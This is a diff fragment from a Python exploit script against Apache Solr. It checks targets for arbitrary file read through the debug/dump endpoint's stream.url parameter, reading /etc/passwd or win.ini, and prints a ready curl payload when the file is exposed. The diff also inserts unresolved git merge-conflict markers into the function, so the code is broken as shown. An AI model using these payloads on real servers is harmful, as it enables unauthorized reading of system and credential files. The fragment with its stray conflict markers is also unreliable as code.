@@ -20,14 +20,20 @@ def exp(url):
 
             linux = linuxFile(url,dbName)
             if 'root:x:0:0:' in linux:
+<<<<<<< HEAD
                 print(linux + '\n')
+=======
+>>>>>>> b9bc7dae7aa85da5caedc75b817444b781729d3e
                 exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                 print("[+ !vul  Payload: {}".format(exp))
                 return True
 
             win = windowsFile(url,dbName)
             if 'extensions' in win:
+<<<<<<< HEAD
                 print(win + '\n')
+=======
+>>>>>>> b9bc7dae7aa85da5caedc75b817444b781729d3e
                 exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                 print("[+ !vul Payload: {}".format(exp))
                 return True
